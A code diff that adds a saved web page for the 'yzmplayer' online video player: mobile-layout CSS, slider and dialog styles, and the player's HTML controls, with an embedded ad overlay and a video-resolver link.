+.mb_class .yzmplayer-controller-comment .controller-box .yzmplayer-icons-left {
+	display: none;
+}
+
+.mb_class .yzmplayer-controller-comment .controller-box .yzmplayer-icons-right {
+	display: none;
+}
+
+/*竖屏 css*/
+@media screen and (orientation: portrait) {
+}
+
+/*横屏 css*/
+@media screen and (orientation: landscape) {
+    
+	.mb_class .yzmplayer-danmaku {
+		bottom: 7%;
+	}
+
+	.mb_class .yzmplayer-controller-mask {
+		height: 0.91rem;
+	}
+
+	.mb_class .yzmplayer-notice {
+		bottom: 1.0rem;
+		left: 0rem;
+	}
+
+	.mb_class .yzmplayer-controller {
+		height: 0.8rem;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-comment .yzmplayer-icon {
+		width: 0.52rem !important;
+	}
+
+	.mb_class #videoNextButton {
+		padding: 0rem;
+	}
+
+	.mb_class #videoNextButton .yzmplayer-icon-content svg {
+		width: 100%;
+	}
+
+	.mb_class #videoNextButton {
+		width: 0.76rem !important;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+		width: 0.56rem !important;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+		bottom: 0.1rem;
+		height: 0.58rem !important;
+	}
+
+	.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-bar-wrap {
+		bottom: 0.7rem !important;
+	}
+
+	.mb_class .yzmplayer-mask {
+		bottom: 13%;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-setting-icon {
+		width: 0.56rem !important;
+		top: 0.03rem;
+	}
+
+	.mb_class .yzmplayer-full-icon span, .mb_class .yzmplayer-fulloff-icon span {
+		width: 0.55rem;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-full-icon {
+		top: 0rem;
+	}
+
+	.mb_class .yzmplayer .yzmplayer-showing {
+		width: 1.3rem;
+		height: 1.3rem !important;
+		bottom: 1.2rem;
+	}
+
+	.mb_class .yzmplayer-controller .yzmplayer-icons .yzmplayer-play-icon {
+		left: -0.1rem;
+		width: 0.5rem;
+	}
+
+	.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-comment-input {
+		width: calc(100% - 2.4rem);
+		height: 0.58rem;
+		line-height: 0.58rem;
+		margin-left: 0.63rem;
+		font-size: 0.25rem;
+	}
+
+	.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzm-yzmplayer-send-icon {
+		height: 0.58rem;
+		line-height: 0.58rem;
+		font-size: 0.25rem;
+		width: 1.1rem !important;
+	}
+
+	.mb_class .yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon {
+		top: -0.03rem;
+	}
+}
+
+
+.range-slider {
+	margin: 0 10px;
+}
+.range-slider-track {
+	width: inherit;
+	height: 15px;
+	margin: 0 auto;
+	position: relative;
+	cursor: e-resize;
+}
+.range-slider-track:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 7px;
+	left: 0;
+	width: 100%;
+	height: 2px;
+	background-color: #000;
+}
+.range-slider-track .dragger {
+	display: block;
+	width: 15px;
+	height: inherit;
+	border-radius: 15px;
+	position: relative;
+	z-index: 2;
+	background-color: #00a1d6;
+	cursor: inherit;
+}
+.range-slider-vertical {
+	display: inline-block;
+	vertical-align: middle;
+	margin: 5px 10px 5px 0;
+}
+
+.range-slider-vertical .range-slider-track {
+	cursor: n-resize;
+	width: 20px;
+	height: 100px;
+}
+.range-slider-vertical .range-slider-track:before {
+	top: 0;
+	right: auto;
+	left: 9px;
+	width: 2px;
+	height: 100%;
+}
+.range-slider-vertical .range-slider-track .dragger {
+	width: inherit;
+	height: 10px;
+}
+.range-slider-track-actived {
+	width: inherit;
+	height: 2px;
+	background-color: #00a1d6;
+	display: block;
+	position: absolute;
+	top: 50%;
+	transform: translateY(-50%);
+}
+
+.layui-layer {
+    background-color: rgba(33,33,33,.9) !important;
+}
+
+.layui-layer-dialog{
+    min-width: 400px !important;
+}
+
+.layui-layer-title{
+    padding: 0 20px 0 20px !important;
+    height: 32px;
+    line-height: 32px;
+    font-size: 16px!important;
+    border-bottom: none !important;
+    color: #fff !important;
+    overflow: hidden;
+    background-color: rgba(33,33,33,.9) !important;
+    border-radius: 6px 6px 0 0 !important;
+    border-bottom: 1px solid hsla(0,0%,100%,.12)!important;
+}
+
+.layui-layer-setwin{
+    top: 8px !important;
+}
+
+.layui-layer-btn a{
+    color: #fff !important;
+    width: 64px;
+    border: 1px solid #4c4c4c !important;
+}
+
+.layui-layer-btn a:hover{
+    color: #fff !important;
+    border: 1px solid #4c4c4c !important;
+}
+.layui-layer-ico {
+    background: url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgc3R5bGU9IndpZHRoOiAxZW07aGVpZ2h0OiAxZW07dmVydGljYWwtYWxpZ246IG1pZGRsZTtmaWxsOiBjdXJyZW50Q29sb3I7b3ZlcmZsb3c6IGhpZGRlbjsiIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwLWlkPSI3NDc1Ij48cGF0aCBkPSJNODE1Ljk4MTcxNCAyMDQuMjg4YTczLjY1NDg1NyA3My42NTQ4NTcgMCAwIDEgMCAxMDMuOTM2bC01MDguMjY5NzE0IDUwOS45NTJhNzMuMTQyODU3IDczLjE0Mjg1NyAwIDAgMS0xMDMuNDI0IDAgNzMuNjU0ODU3IDczLjY1NDg1NyAwIDAgMSAwLTEwMy45MzZsNTA4LjI2OTcxNC01MDkuOTUyYTczLjE0Mjg1NyA3My4xNDI4NTcgMCAwIDEgMTAzLjQyNCAweiIgZmlsbD0iI2ZmZmZmZiIgcC1pZD0iNzQ3NiI+PC9wYXRoPjxwYXRoIGQ9Ik04MTkuNjM4ODU3IDgxOC4xNzZhNzMuNTgxNzE0IDczLjU4MTcxNCAwIDAgMS0xMDMuOTM2IDBMMjA1Ljc1MDg1NyAzMDguMDc3NzE0YTczLjQzNTQyOSA3My40MzU0MjkgMCAwIDEgMTAzLjkzNi0xMDMuNzg5NzE0bDUwOS45NTIgNTEwLjA5ODI4NmE3My4xNDI4NTcgNzMuMTQyODU3IDAgMCAxIDAgMTAzLjc4OTcxNHoiIGZpbGw9IiNmZmZmZmYiIHAtaWQ9Ijc0NzciPjwvcGF0aD48L3N2Zz4=)!important;
+}
+.yzmplayer-color-popup {
+    color: #fff!important;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track .dragger{
+    width: 11px;
+    height: 11px;
+    border-radius: 11px;
+    top: 3.5px;
+    cursor: pointer;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track{
+    height: inherit !important;
+    cursor: inherit;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track:before{
+    height: 3px !important;
+    background-color: #fff;
+    top: 50%;
+    transform: translateY(-50%);
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track-actived{
+    height: 3px !important;
+}
+
+.mb_class .yzmplayer-setting-danmaku-proportion .range-slider-track .dragger{
+    top: 4.5px;
+}
+
+
+</style><script src="./layer.js.下载" type="text/javascript"></script><script src="./MTAyNDkzMg==_bmltYV8xNDc1ODUzMjA4NjFfMTcwMTY5MjczODQ2NF8zYzhhYzNlOC03YWQ4LTQwNjMtOTNhYS1hMjlmYmFiZGNlNzA=" type="text/javascript"></script><script src="./MTAyNDkzMg==_bmltYV8xNDc1ODUzMjA4NjFfMTcwMTY5MzAyNzI2N18xODJmMTFiNS05MzU5LTQwMmMtYWNiNS1jMWM2NzA4N2ZlNWU=" type="text/javascript"></script><script src="./count.js.下载" type="text/javascript"></script><body style="background-color: rgb(0, 0, 0);" inject_video_svd="true">
+        <script type="text/javascript" src="./MTAyNDkzMg==_bmltYV8xNDc1ODUzMjA4NjFfMTcwNTA0NTM2ODk3MV9mOTRmNTU4OC03ZmQ3LTQ2NjYtOWVlMS1iNGM0MjNmN2UyMGE="></script><div class="loading" id="my-loading" style="display: none;"><div class="pic" id="my-loading-pic" style="width: 136px; height: 162px; background: url(&quot;data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjbGFzcz0ibnVtYmVyIiB2aWV3Qm94PSIwIDAgODAwIDgwMCIgc3R5bGU9ImJhY2tncm91bmQ6ICMwMDA7Ij48ZGVmcz48c3R5bGU+LmNscy0xLCAgICAgICAgLmNscy0yLCAgICAgICAgLmNscy0zLCAgICAgICAgLmNscy00LCAgICAgICAgLmNscy01LCAgICAgICAgLmNscy02IHsgICAgICAgICAgICBmaWxsOiBub25lOyAgICAgICAgICAgIHN0cm9rZS1saW5lY2FwOiByb3VuZDsgICAgICAgICAgICBzdHJva2UtbWl0ZXJsaW1pdDogMTA7ICAgICAgICAgICAgc3Ryb2tlLXdpZHRoOiA1My4xMnB4OyAgICAgICAgfSAgICAgICAgLmNscy0xIHsgICAgICAgICAgICBzdHJva2U6IHVybCgjbGluZWFyLWdyYWRpZW50KTsgICAgICAgIH0gICAgICAgIC5jbHMtMiB7ICAgICAgICAgICAgc3Ryb2tlOiB1cmwoI2xpbmVhci1ncmFkaWVudC0yKTsgICAgICAgIH0gICAgICAgIC5jbHMtMyB7ICAgICAgICAgICAgc3Ryb2tlOiB1cmwoI2xpbmVhci1ncmFkaWVudC0zKTsgICAgICAgIH0gICAgICAgIC5jbHMtNCB7ICAgICAgICAgICAgc3Ryb2tlOiB1cmwoI2xpbmVhci1ncmFkaWVudC00KTsgICAgICAgIH0gICAgICAgIC5jbHMtNSB7ICAgICAgICAgICAgc3Ryb2tlOiB1cmwoI2xpbmVhci1ncmFkaWVudC01KTsgICAgICAgIH0gICAgICAgIC5jbHMtNiB7ICAgICAgICAgICAgc3Ryb2tlOiB1cmwoI2xpbmVhci1ncmFkaWVudC02KTsgICAgICAgIH08L3N0eWxlPjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50IiB4MT0iMzI1LjUiIHkxPSI2ODcuMjYiIHgyPSIzMjUuNSIgeTI9IjEzMi43NyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPjxzdG9wIG9mZnNldD0iMC42OCIgc3RvcC1jb2xvcj0iIzFhODFkNCIvPjxzdG9wIG9mZnNldD0iMC45MSIgc3RvcC1jb2xvcj0iIzcwMjk5MyIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlkPSJsaW5lYXItZ3JhZGllbnQtMiIgeDE9IjE3NS4xIiB5MT0iMTU5LjMxIiB4Mj0iNDIyLjY5IiB5Mj0iMTU5LjMxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjZjdhOGZmIi8+PHN0b3Agb2Zmc2V0PSIwLjkiIHN0b3AtY29sb3I9IiM3MDI5OTMiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50LTMiIHgxPSI0MjIuMzkiIHkxPSI2ODcuMjYiIHgyPSI0MjIuMzkiIHkyPSIxMzIuNzciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBvZmZzZXQ9IjAuNjgiIHN0b3AtY29sb3I9IiMwYWE1ZTAiLz48c3RvcCBvZmZzZXQ9IjAuOTEiIHN0b3AtY29sb3I9IiM3MDI5OTMiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50LTQiIHgxPSIyNzIiIHkxPSIxNTkuMzEiIHgyPSI1MTkuNTkiIHkyPSIxNTkuMzEiIHhsaW5rOmhyZWY9IiNsaW5lYXItZ3JhZGllbnQtMiIvPjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50LTUiIHgxPSI1MTkuMjkiIHkxPSI2ODcuMjYiIHgyPSI1MTkuMjkiIHkyPSIxMzIuNzciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj48c3RvcCBvZmZzZXQ9IjAuNjgiIHN0b3AtY29sb3I9IiMzM2MzZDQiLz48c3RvcCBvZmZzZXQ9IjAuOTEiIHN0b3AtY29sb3I9IiM3MDI5OTMiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0ibGluZWFyLWdyYWRpZW50LTYiIHgxPSIzNjguODkiIHkxPSIxNTkuMzEiIHgyPSI2MTYuNDgiIHkyPSIxNTkuMzEiIHhsaW5rOmhyZWY9IiNsaW5lYXItZ3JhZGllbnQtMiIvPjwvZGVmcz48ZyBjbGFzcz0iZ3JvdXAiIHN0eWxlPSItLWdyb3VwOiAxOyAtLWRpc3BsYWNlOi0xJTsiPjxwYXRoIGNsYXNzPSJjbHMtMSBwYXRoIHBhdGgtMiIgZD0iTTIyOC4xMyw2NjAuN3MxNTcuNDItMzgyLjEsMTg3Ljc5LTQ1MWMxMy43My0zMS4xNSw3LjA5LTUwLjM4LTE5Ljc5LTUwLjM4IiBzdHlsZT0iLS1sZW5ndGg6NTU4OyAtLWRvdWJsZS1sZW5ndGg6MTExNjsgLS1uZWdhdGl2ZS1sZW5ndGg6LTExMTY7Ii8+PHBhdGggY2xhc3M9ImNscy0yIHBhdGggcGF0aC0xIiBkPSJNMzk2LjEzLDE1OS4zM2wtMTk0LjQ3LDAiIHN0eWxlPSItLWxlbmd0aDoxOTU7IC0tZG91YmxlLWxlbmd0aDozOTA7IC0tbmVnYXRpdmUtbGVuZ3RoOi0zOTA7Ii8+PC9nPjxnIGNsYXNzPSJncm91cCIgc3R5bGU9Ii0tZ3JvdXA6IDI7IC0tZGlzcGxhY2U6NCU7Ij48cGF0aCBjbGFzcz0iY2xzLTMgcGF0aCBwYXRoLTIiIGQ9Ik0zMjUsNjYwLjdzMTU3LjQyLTM4Mi4xLDE4Ny43OS00NTFjMTMuNzMtMzEuMTUsNy4wOC01MC4zOC0xOS43OS01MC4zOCIgc3R5bGU9Ii0tbGVuZ3RoOjU1ODsgLS1kb3VibGUtbGVuZ3RoOjExMTY7IC0tbmVnYXRpdmUtbGVuZ3RoOi0xMTE2OyIvPjxwYXRoIGNsYXNzPSJjbHMtNCBwYXRoIHBhdGgtMSIgZD0iTTI5OC41NiwxNTkuM2wxOTQuNDcsMCIgc3R5bGU9Ii0tbGVuZ3RoOjE5NTsgLS1kb3VibGUtbGVuZ3RoOjM5MDsgLS1uZWdhdGl2ZS1sZW5ndGg6LTM5MDsiLz48L2c+PGcgY2xhc3M9Imdyb3VwIiBzdHlsZT0iLS1ncm91cDogMzsgLS1kaXNwbGFjZTo2JTsiPjxwYXRoIGNsYXNzPSJjbHMtNSBwYXRoIHBhdGgtMiIgZD0iTTQyMS45Miw2NjAuN3MxNTcuNDItMzgyLjEsMTg3Ljc5LTQ1MWMxMy43My0zMS4xNSw3LjA5LTUwLjM4LTE5Ljc5LTUwLjM4IiBzdHlsZT0iLS1sZW5ndGg6NTU4OyAtLWRvdWJsZS1sZW5ndGg6MTExNjsgLS1uZWdhdGl2ZS1sZW5ndGg6LTExMTY7Ii8+PHBhdGggY2xhc3M9ImNscy02IHBhdGggcGF0aC0xIiBkPSJNNTg5LjkyLDE1OS4zM2wtMTk0LjQ3LDAiIHN0eWxlPSItLWxlbmd0aDoxOTU7IC0tZG91YmxlLWxlbmd0aDozOTA7IC0tbmVnYXRpdmUtbGVuZ3RoOi0zOTA7Ii8+PC9nPjwvc3ZnPg==&quot;) 0% 0% / 136px no-repeat; left: 50%; top: 50%; position: absolute; opacity: 1; transform: translate3d(-50%, -50%, 0px);"></div></div><div id="videoBlock"><div class="player yzmplayer yzmplayer-paused" id="player"><div id="loading-box" style="display:none;"><div class="loading"><div class="tips"></div></div><div type="button" id="close"><div class="playlink"><span id="link1" style="display: inline;"></span><span id="link1-success" style="display: inline;"></span></div><div class="dmlink"><span id="link2-success" style="display: block;"></span><span id="link2-error"></span></div><span class="palycon" id="link3" style="display: inline;"><e id="link3_tip"></e><e id="link3-error"></e><!--d class="wait"><e id="span">3</e>s</d--></span></div></div><div class="yzmplayer-mask"></div>
+<div class="yzmplayer-cplayer"><div class="yzmplayer-showing" style="height:70px"><svg viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><path id="pid-1-svgo-a" d="M0 0h80v80H0z"></path><path d="M52.546 8.014a3.998 3.998 0 014.222 3.077c.104.446.093.808.039 1.138a2.74 2.74 0 01-.312.881c-.073.132-.16.254-.246.376l-.257.366-.521.73c-.7.969-1.415 1.926-2.154 2.866l-.015.02a240.945 240.945 0 015.986.341l1.643.123.822.066.41.034.206.018.103.008.115.012c1.266.116 2.516.45 3.677.975a11.663 11.663 0 013.166 2.114c.931.87 1.719 1.895 2.321 3.022a11.595 11.595 0 011.224 3.613c.03.157.046.316.068.474l.015.119.013.112.022.206.085.822.159 1.646c.1 1.098.19 2.198.27 3.298.315 4.4.463 8.829.36 13.255a166.489 166.489 0 01-.843 13.213c-.012.127-.034.297-.053.454a7.589 7.589 0 01-.072.475l-.04.237-.05.236a11.762 11.762 0 01-.74 2.287 11.755 11.755 0 01-5.118 5.57 11.705 11.705 0 01-3.623 1.263c-.158.024-.316.052-.475.072l-.477.053-.821.071-1.644.134c-1.096.086-2.192.16-3.288.23a260.08 260.08 0 01-6.578.325c-8.772.324-17.546.22-26.313-.302a242.458 242.458 0 01-3.287-.22l-1.643-.129-.822-.069-.41-.035-.206-.018c-.068-.006-.133-.01-.218-.02a11.566 11.566 0 01-3.7-.992 11.732 11.732 0 01-5.497-5.178 11.73 11.73 0 01-1.215-3.627c-.024-.158-.051-.316-.067-.475l-.026-.238-.013-.119-.01-.103-.07-.823-.132-1.648a190.637 190.637 0 01-.22-3.298c-.256-4.399-.358-8.817-.258-13.233.099-4.412.372-8.811.788-13.197a11.65 11.65 0 013.039-6.835 11.585 11.585 0 016.572-3.563c.157-.023.312-.051.47-.07l.47-.05.82-.07 1.643-.13a228.493 228.493 0 016.647-.405l-.041-.05a88.145 88.145 0 01-2.154-2.867l-.52-.73-.258-.366c-.086-.122-.173-.244-.246-.376a2.74 2.74 0 01-.312-.881 2.808 2.808 0 01.04-1.138 3.998 3.998 0 014.22-3.077 2.8 2.8 0 011.093.313c.294.155.538.347.742.568.102.11.19.23.28.35l.27.359.532.72a88.059 88.059 0 012.06 2.936 73.036 73.036 0 011.929 3.03c.187.313.373.628.556.945 2.724-.047 5.447-.056 8.17-.038.748.006 1.496.015 2.244.026.18-.313.364-.624.549-.934a73.281 73.281 0 011.93-3.03 88.737 88.737 0 012.059-2.935l.533-.72.268-.359c.09-.12.179-.24.281-.35a2.8 2.8 0 011.834-.881zM30.13 34.631a4 4 0 00-.418 1.42 91.157 91.157 0 00-.446 9.128c0 2.828.121 5.656.364 8.483l.11 1.212a4 4 0 005.858 3.143c2.82-1.498 5.55-3.033 8.193-4.606a177.41 177.41 0 005.896-3.666l1.434-.942a4 4 0 00.047-6.632 137.703 137.703 0 00-7.377-4.708 146.88 146.88 0 00-6.879-3.849l-1.4-.725a4 4 0 00-5.382 1.742z" id="pid-1-svgo-d"></path><filter x="-15.4%" y="-16.3%" width="130.9%" height="132.5%" filterUnits="objectBoundingBox" id="pid-1-svgo-c"><feoffset dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feoffset><fegaussianblur stdDeviation="1" in="shadowOffsetOuter1" result="shadowBlurOuter1"></fegaussianblur><fecolormatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0" in="shadowBlurOuter1" result="shadowMatrixOuter1"></fecolormatrix><feoffset in="SourceAlpha" result="shadowOffsetOuter2"></feoffset><fegaussianblur stdDeviation="3.5" in="shadowOffsetOuter2" result="shadowBlurOuter2"></fegaussianblur><fecolormatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.2 0" in="shadowBlurOuter2" result="shadowMatrixOuter2"></fecolormatrix><femerge><femergenode in="shadowMatrixOuter1"></femergenode><femergenode in="shadowMatrixOuter2"></femergenode></femerge></filter></defs><g fill="none" fill-rule="evenodd" opacity=".8"><mask id="pid-1-svgo-b" fill="#fff"><use xlink:href="#pid-1-svgo-a"></use></mask><g mask="url(#pid-1-svgo-b)"><use fill="#000" filter="url(#pid-1-svgo-c)" xlink:href="#pid-1-svgo-d"></use><use fill="#FFF" xlink:href="#pid-1-svgo-d"></use></g></g></svg></div><div class="vod-title"><div id="landing-title" class="video-info"><ul class="u-title"><a id="vodlink" href="https://jx.jsonplayer.com/player/?url=https://v.qq.com/x/cover/mzc00200tl9nvn9/j0047a185to.html" target="_blank"><span class="iconfont icon-back"></span></a><a id="vodtitle"><span></span></a></ul></div></div></div><div class="yzmplayer-video-wrap">
+    
+<video id="video" autoplay="" muted="" class="yzmplayer-video yzmplayer-video-current" webkit-playsinline="" playsinline="" preload="auto" src="blob:https://jx.jsonplayer.com/7f55da4d-88cf-4940-a0c1-a8d49f467a09">
+    
+</video>
+    
+    <div class="yzmplayer-danmaku">
+        <div class="yzmplayer-danmaku-item yzmplayer-danmaku-item--demo" style="opacity: 0.7;"></div>
+    </div>
+    <div class="yzmplayer-subtitle"></div>
+    <div class="yzmplayer-bezel">
+        <span class="yzmplayer-bezel-icon yzmplayer-bezel-transition"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M17.982 9.275L8.06 3.27A2.013 2.013 0 005 4.994v12.011a2.017 2.017 0 003.06 1.725l9.922-6.005a2.017 2.017 0 000-3.45z"></path></svg></span>
+        
+        <span class="yzmplayer-danloading" style="display: none;">弹幕加载中</span>
+        
+        <span class="diplayer-loading-icon"><svg version="1.1" viewBox="0 0 22 22"><svg x="7" y="1"><circle class="diplayer-loading-dot diplayer-loading-dot-0" cx="4" cy="4" r="2"></circle></svg><svg x="11" y="3"><circle class="diplayer-loading-dot diplayer-loading-dot-1" cx="4" cy="4" r="2"></circle></svg><svg x="13" y="7"><circle class="diplayer-loading-dot diplayer-loading-dot-2" cx="4" cy="4" r="2"></circle></svg><svg x="11" y="11"><circle class="diplayer-loading-dot diplayer-loading-dot-3" cx="4" cy="4" r="2"></circle></svg><svg x="7" y="13"><circle class="diplayer-loading-dot diplayer-loading-dot-4" cx="4" cy="4" r="2"></circle></svg><svg x="3" y="11"><circle class="diplayer-loading-dot diplayer-loading-dot-5" cx="4" cy="4" r="2"></circle></svg><svg x="1" y="7"><circle class="diplayer-loading-dot diplayer-loading-dot-6" cx="4" cy="4" r="2"></circle></svg><svg x="3" y="3"><circle class="diplayer-loading-dot diplayer-loading-dot-7" cx="4" cy="4" r="2"></circle></svg></svg></span>
+    </div>
+<div id="adv_wrap_hh" style="width: 74%; height: 80%; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -60%); max-width: 600px; max-height: 400px; z-index: 10000000; display: none;"><a href="http://jg.awaliwa.com/tg/visitor?id=253&amp;lg=12733647&amp;s=28321&amp;c=78423&amp;z=8381" id="hmhrefurl" onclick="clickActionFunction()" target="_blank" style="width: 100%;height: 100%;"><img src="./6bkk1QxddqmVSEOq.gif" alt="" style="display: block;width: 100%;height: 100%;" id="img-random-hm"><img style="position: absolute;width:auto;bottom:0;right:0;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAQCAYAAAAFzx/vAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAHhJREFUeNpi1Oi7MZOBjoCJgc6AoIXXC9XTSDGQkHqCFmr235xFyBBSHMWIHofEagY5hFg9yGpZCCkgJgjRLcenn+JEQ4rjcPqQ0gSCTRzmMBZ6+o5iC4lNZAQTDTV9iu4gupc0VPEhKRmfBV+eokWQMg772gIgwADcMj5Lyf2sGwAAAABJRU5ErkJggg=="></a></div></div>
+<div class="yzmplayer-controller-mask"></div>
+<div class="yzmplayer-controller">
+  <div class="controller-box">
+   <div class="yzmplayer-icons yzmplayer-icons-left">
+        <button class="yzmplayer-icon yzmplayer-play-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M17.982 9.275L8.06 3.27A2.013 2.013 0 005 4.994v12.011a2.017 2.017 0 003.06 1.725l9.922-6.005a2.017 2.017 0 000-3.45z"></path></svg></button>
+    
+    <div class="yzmplayer-volume">
+            <button class="yzmplayer-icon yzmplayer-volume-icon" id="lottie-volume"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88 88" width="88" height="88" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_128"><rect width="88" height="88" x="0" y="0"></rect></clippath><clippath id="__lottie_element_130"><path d="M0,0 L88,0 L88,88 L0,88z"></path></clippath></defs><g clip-path="url(#__lottie_element_128)"><g clip-path="url(#__lottie_element_130)" transform="matrix(1,0,0,1,0,0)" opacity="1" style="display: block;"><g transform="matrix(1,0,0,1,28,44)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M15.5600004196167,-25.089000701904297 C15.850000381469727,-24.729000091552734 16,-24.288999557495117 16,-23.839000701904297 C16,-23.839000701904297 16,23.840999603271484 16,23.840999603271484 C16,24.94099998474121 15.100000381469727,25.840999603271484 14,25.840999603271484 C13.550000190734863,25.840999603271484 13.109999656677246,25.680999755859375 12.75,25.400999069213867 C12.75,25.400999069213867 -4,12.00100040435791 -4,12.00100040435791 C-4,12.00100040435791 -8,12.00100040435791 -8,12.00100040435791 C-12.420000076293945,12.00100040435791 -16,8.420999526977539 -16,4.000999927520752 C-16,4.000999927520752 -16,-3.999000072479248 -16,-3.999000072479248 C-16,-8.418999671936035 -12.420000076293945,-11.99899959564209 -8,-11.99899959564209 C-8,-11.99899959564209 -4,-11.99899959564209 -4,-11.99899959564209 C-4,-11.99899959564209 12.75,-25.39900016784668 12.75,-25.39900016784668 C13.609999656677246,-26.089000701904297 14.869999885559082,-25.948999404907227 15.5600004196167,-25.089000701904297z"></path></g></g><g style="display: none;"><g><path></path></g></g><g style="display: none;"><g><path></path></g></g><g style="display: none;"><g><path></path></g></g><g style="display: none;"><g><path></path></g></g><g transform="matrix(1,0,0,1,56,44)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-4,-13.859000205993652 C0.7799999713897705,-11.08899974822998 4,-5.919000148773193 4,0.0010000000474974513 C4,5.921000003814697 0.7799999713897705,11.090999603271484 -4,13.861000061035156 C-4,13.861000061035156 -4,-13.859000205993652 -4,-13.859000205993652z"></path></g></g><g transform="matrix(1,0,0,1,64.01399993896484,44.00699996948242)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-6.236000061035156,-28.895999908447266 C4.803999900817871,-23.615999221801758 11.984000205993652,-12.456000328063965 11.984000205993652,-0.006000000052154064 C11.984000205993652,12.454000473022461 4.794000148773193,23.624000549316406 -6.265999794006348,28.893999099731445 C-8.255999565124512,29.8439998626709 -10.645999908447266,29.003999710083008 -11.595999717712402,27.003999710083008 C-12.545999526977539,25.013999938964844 -11.696000099182129,22.624000549316406 -9.706000328063965,21.673999786376953 C-1.406000018119812,17.724000930786133 3.9839999675750732,9.343999862670898 3.9839999675750732,-0.006000000052154064 C3.9839999675750732,-9.345999717712402 -1.3960000276565552,-17.715999603271484 -9.675999641418457,-21.676000595092773 C-11.675999641418457,-22.625999450683594 -12.515999794006348,-25.016000747680664 -11.565999984741211,-27.006000518798828 C-10.616000175476074,-29.006000518798828 -8.22599983215332,-29.84600067138672 -6.236000061035156,-28.895999908447266z"></path></g></g></g></g></svg></button>
+            <div class="yzmplayer-volume-bar-wrap" data-balloon-pos="up" data-balloon="70%">
+                <div class="yzmplayer-volume-bar">
+                    <div class="yzmplayer-volume-bar-inner" style="background: rgb(0, 161, 214); width: 70%;">
+                        <span class="yzmplayer-thumb" style="background: #00a1d6"></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <span class="yzmplayer-time">
+            <span class="yzmplayer-ptime">0:00</span> /
+            <span class="yzmplayer-dtime">30:21</span>
+        </span>
+        
+    </div>
+    <div class="yzmplayer-icons yzmplayer-icons-right">
+        
+        
+        <div class="yzmplayer-comment">
